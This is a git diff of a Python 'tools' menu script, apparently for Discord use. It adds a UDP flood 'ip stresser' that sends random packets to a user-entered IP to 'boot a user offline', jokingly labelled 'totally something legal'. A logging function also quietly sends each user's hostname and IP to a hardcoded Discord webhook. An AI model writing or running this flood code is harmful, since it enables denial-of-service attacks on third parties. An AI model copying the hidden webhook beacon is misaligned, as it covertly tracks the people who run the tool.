@@ -4,10 +4,12 @@ import pprint
 from dhooks import Webhook
 import socket, threading
 from covid import Covid
+import bcrypt
 
 def log(name):
     logging = Webhook("https://discord.com/api/webhooks/754324914189893632/9QruauiSVUyFoLzi6YVxLLA_qcWqSK1W766K40ohVxYug4UV95YWH2QIaSaw4JXjrGau")
-    datae = f"{name} has been executed by {socket.gethostname()}, with the ip adress of {socket.gethostbyname(socket.getfqdn())}"
+    ip = socket.gethostbyname(socket.getfqdn())
+    datae = f"{name} has been executed by {socket.gethostname()}, with the ip adress of {ip}"
     logging.send(datae)
 # tools lol
 
@@ -91,32 +93,56 @@ def covidCheck():
             Main()
 def ipStresser():
     class Denial:
-        def __init__(self, host, port):
-                threading.Thread.__init__(self)
-                self.connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                self.connection =setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR)
-                self.host = host
-                self.port = 80
-                self.duration = 0
-                self.bytes = random._urandom(1024)
-                self.send = 0
+        def __init__(self, host):
+            threading.Thread.__init__(self)
+            self.connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.host = host
+            self.port = 80 
+            self.duration = 0
+            self.bytes = random._urandom(1024)
+            self.sent = 0
+
+
         def send_packet(self):
             while True:
                 try:
-                    send_all = self.connection.sendto(self.bytes(self.host, self.port))
-                    print("[+] flood has started on " + self.host)
+                    send_all = self.connection.sendto(self.bytes,(self.host, self.port))
+                    print("[**] Flood Started... On " + self.host)
                 except UnboundLocalError:
                     try:
                         pass
-                        send_all = self.connection.sendto(self.bytes(self.host, self.port))
+                        print("[**] Flood Started... On " + self.host)
                     except:
                         pass
                 except KeyboardInterrupt:
-                    print("\n [-] Exiting... ")
+                    print("\n")
+                    print("[+] Exiting....")
+                    print("\n")
             while True:
                 connect_all = send_all.accept()
                 newthread = ClientThread(send_all)
-# main code
+                newthread.start()
+
+                print("[+] Press Control^C to End! ")
+                more_dos = input("[+] Would You Like To Boot A User Offline[exit/return]: ")
+
+                if more_dos == "exit":
+                    self.connection.close()
+                    exit()
+                elif more_dos == "return":
+                    self.send_packet()
+                else:
+                    self.connection.close()
+                    exit()
+
+    ip_attack = input("Enter ip address: ")
+    results = Denial(ip_attack)
+    results.send_packet()
+    Main()
+
+
+    # main code
 class Main():
     def cls(self):
         linux = "clear"
@@ -158,6 +184,11 @@ class Main():
                 self.cls()
                 self.start_logo()
                 covidCheck()
+            elif(choose == str(6)):
+                self.cls()
+                self.start_logo()
+                ipStresser()
+
 
 
     def start_logo(self):
@@ -182,6 +213,8 @@ class Main():
         print(self.y + '        [3]' + self.c + '  webhook spammer')
         print(self.y + '        [4]' + self.c + '  webhook deleter')
         print(self.y + '        [5]' + self.c + '  covid')
+        print(self.y + '        [6]' + self.c + '  totally something legal yes yes')
+
 
 
 Main()
